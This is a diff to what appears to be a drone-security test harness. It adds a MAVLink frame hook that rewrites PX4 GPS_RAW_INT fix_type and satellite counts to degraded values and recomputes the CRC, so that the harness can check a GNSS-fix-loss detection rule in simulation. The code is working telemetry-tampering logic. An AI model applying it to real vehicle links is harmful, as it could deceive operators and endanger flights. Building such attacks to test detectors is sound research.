@@ -264,6 +264,206 @@ class PositionDriftAttack:
 
 
 # --------------------------------------------------------------------------- #
+# GNSS fix-quality degradation (content attack, Stage-2 P2 extension): tests the
+# dedicated GNSS-fix-loss rule (protocol.py min_gnss_fix_type/min_gnss_satellites/
+# gnss_loss_ticks) on live PX4 data for the first time -- distinct from DROP (which
+# tests liveness-by-ABSENCE of GPS_RAW_INT/GLOBAL_POSITION_INT) and from
+# PositionDriftAttack (which forges a plausible, still-valid-looking fix). This
+# attack keeps GPS_RAW_INT ARRIVING, but with its own fix_type/satellites_visible
+# fields forced below the rule's thresholds -- the on-the-wire shape of a real GNSS
+# jammer/denial (receiver still reports status, just a degraded one), not a dropped
+# or spoofed-but-healthy-looking link.
+# --------------------------------------------------------------------------- #
+
+GPS_RAW_INT_ID = 24
+
+#: Degraded values are drawn well below both Stage-1's and the PX4 profile's thresholds
+#: (min_gnss_fix_type=3, min_gnss_satellites=5, neither overridden by configs/px4_sitl --
+#: CALIBRATION_PX4.md section 4), so detection is the designed positive-control outcome,
+#: not a boundary case; the attack's own disclosed ranges, not tuned to any run's result.
+GNSS_DEGRADATION_RANGES: Mapping[str, tuple[float, float]] = {
+    "onset_s": (20.0, 60.0),
+    "duration_s": (15.0, 40.0),
+    "fix_type": (0.0, 1.0),  # NO_GPS or NO_FIX (pymavlink GPS_FIX_TYPE enum 0/1)
+    "satellites_visible": (0.0, 4.0),
+}
+
+
+@dataclass(frozen=True)
+class GnssDegradationParams:
+    """One trial's drawn parameters -- same convention as :class:`PositionDriftParams`."""
+
+    trial_seed: int
+    trial_index: int
+    onset_s: float
+    duration_s: float
+    fix_type: int
+    satellites_visible: int
+
+
+def draw_gnss_degradation_params(
+    seed: int,
+    trial_index: int = 0,
+    ranges: Mapping[str, tuple[float, float]] = GNSS_DEGRADATION_RANGES,
+) -> GnssDegradationParams:
+    """Draw one trial's GNSS-degradation parameters deterministically (see :func:`draw_params`)."""
+    trial_seed = seed + trial_index
+    rng = np.random.default_rng(trial_seed)
+    onset_s = float(rng.uniform(*ranges["onset_s"]))
+    duration_s = float(rng.uniform(*ranges["duration_s"]))
+    fix_type = int(round(float(rng.uniform(*ranges["fix_type"]))))
+    satellites_visible = int(round(float(rng.uniform(*ranges["satellites_visible"]))))
+    return GnssDegradationParams(
+        trial_seed=trial_seed, trial_index=trial_index, onset_s=onset_s, duration_s=duration_s,
+        fix_type=fix_type, satellites_visible=satellites_visible,
+    )
+
+
+class GnssDegradationAttack:
+    """``FrameHook`` modifying only ``GPS_RAW_INT`` (msgid 24) downlink frames from the
+    target vehicle, only inside ``[onset_s, onset_s + duration_s)``, by rewriting
+    ``fix_type``/``satellites_visible`` to the trial's drawn (sub-threshold) values and
+    recomputing the MAVLink2 CRC. ``lat``/``lon``/``alt``/velocities/``eph``/``epv`` are left
+    untouched -- this is a fix-QUALITY attack, not a position-spoofing one; the position
+    fields keep reporting whatever PX4 actually computed. Every other frame (including
+    ``GLOBAL_POSITION_INT``, which is a separate message and is not modified) passes through
+    byte-identical.
+
+    Same conventions as :class:`PositionDriftAttack` (its docstring documents the shared
+    patterns in more depth, not repeated here): passive PX4-identity learning with fail-closed
+    behaviour before it; never raises; signed frames are never modified (counted in
+    ``frames_skipped_signed``); deterministic given ``(params, frame sequence)``.
+    """
+
+    def __init__(
+        self,
+        params: GnssDegradationParams,
+        *,
+        target_sysid: int | None = None,
+        target_compid: int | None = None,
+        warmup_s: float = DEFAULT_WARMUP_S,
+        frame_log: FrameLogWriter | None = None,
+        now_utc: Callable[[], datetime] = lambda: datetime.now(UTC),
+    ) -> None:
+        if (target_sysid is None) != (target_compid is None):
+            raise ValueError("target_sysid and target_compid must both be set or both be None")
+        self.params = params
+        self._target_sysid = target_sysid
+        self._target_compid = target_compid
+        self._warmup_s = warmup_s
+        self._frame_log = frame_log
+        self._now_utc = now_utc
+        self._decoder = mav2.MAVLink(None)
+        self._first_vehicle_recv_ns: int | None = None
+
+        self.frames_seen = 0
+        self.frames_modified = 0
+        self.frames_dropped = 0
+        self.frames_injected = 0
+        self.frames_skipped_signed = 0
+
+    def __call__(self, ctx: FrameContext) -> list[bytes]:
+        self.frames_seen += 1
+        if ctx.direction != "down":
+            return [ctx.raw]
+
+        self._maybe_learn_target(ctx)
+        if self._target_sysid is None:
+            return [ctx.raw]
+
+        is_target = ctx.sysid == self._target_sysid and ctx.compid == self._target_compid
+        if is_target and self._first_vehicle_recv_ns is None:
+            self._first_vehicle_recv_ns = ctx.recv_ns
+
+        if not is_target or ctx.msgid != GPS_RAW_INT_ID:
+            return [ctx.raw]
+
+        elapsed_s = (ctx.recv_ns - self._first_vehicle_recv_ns) / 1e9
+        onset, duration = self.params.onset_s, self.params.duration_s
+        if not (elapsed_s >= max(self._warmup_s, onset) and elapsed_s < onset + duration):
+            return [ctx.raw]
+
+        if ctx.signed:
+            self.frames_skipped_signed += 1
+            self._log(ctx, action="forwarded", field_deltas={}, crc_recomputed=False,
+                       modified_len=len(ctx.raw))
+            return [ctx.raw]
+        if not ctx.raw or ctx.raw[0] != _V2_MAGIC:
+            return [ctx.raw]  # MAVLink 1 (or malformed): pass through, not our target wire format
+
+        try:
+            new_raw, deltas = self._modify(ctx)
+        except Exception:
+            return [ctx.raw]  # never raise: any decode/pack problem passes the original through
+
+        self.frames_modified += 1
+        self._log(ctx, action="modified", field_deltas=deltas, crc_recomputed=True,
+                   modified_len=len(new_raw))
+        return [new_raw]
+
+    # -- internals ------------------------------------------------------------ #
+
+    def _maybe_learn_target(self, ctx: FrameContext) -> None:
+        if self._target_sysid is not None:
+            return
+        if ctx.direction != "down" or ctx.msgid != HEARTBEAT_ID or ctx.signed:
+            return
+        if not ctx.raw or ctx.raw[0] != _V2_MAGIC:
+            return
+        try:
+            msg = self._decoder.decode(bytearray(ctx.raw))
+        except Exception:
+            return
+        if msg.get_type() != "HEARTBEAT":
+            return
+        if getattr(msg, "autopilot", None) == _MAV_AUTOPILOT_PX4:
+            self._target_sysid = ctx.sysid
+            self._target_compid = ctx.compid
+
+    def _modify(self, ctx: FrameContext) -> tuple[bytes, dict[str, int]]:
+        msg = self._decoder.decode(bytearray(ctx.raw))
+        if msg.get_type() != "GPS_RAW_INT":
+            raise ValueError(f"unexpected decoded type {msg.get_type()!r} for msgid {GPS_RAW_INT_ID}")
+
+        fix0, sats0 = int(msg.fix_type), int(msg.satellites_visible)
+        msg.fix_type = self.params.fix_type
+        msg.satellites_visible = self.params.satellites_visible
+        encoder = mav2.MAVLink(None, srcSystem=ctx.sysid, srcComponent=ctx.compid)
+        encoder.seq = ctx.seq
+        new_raw = bytes(msg.pack(encoder))
+
+        return new_raw, {"fix_type": self.params.fix_type - fix0,
+                         "satellites_visible": self.params.satellites_visible - sats0}
+
+    def _log(
+        self,
+        ctx: FrameContext,
+        *,
+        action: str,
+        field_deltas: dict[str, int],
+        crc_recomputed: bool,
+        modified_len: int,
+    ) -> None:
+        if self._frame_log is None:
+            return
+        entry = FrameLogEntry(
+            seq_no=self.frames_seen,
+            proxy_recv_time_utc=self._now_utc().isoformat().replace("+00:00", "Z"),
+            recv_ns=ctx.recv_ns,
+            msgid=ctx.msgid,
+            sysid=ctx.sysid,
+            compid=ctx.compid,
+            mavlink_seq=ctx.seq,
+            action=action,
+            field_deltas=field_deltas,
+            crc_recomputed=crc_recomputed,
+            original_len=len(ctx.raw),
+            modified_len=modified_len,
+        )
+        self._frame_log.append(entry)
+
+
+# --------------------------------------------------------------------------- #
 # Second live attack: uplink COMMAND_LONG injection (rogue GCS identity)
 # --------------------------------------------------------------------------- #
 
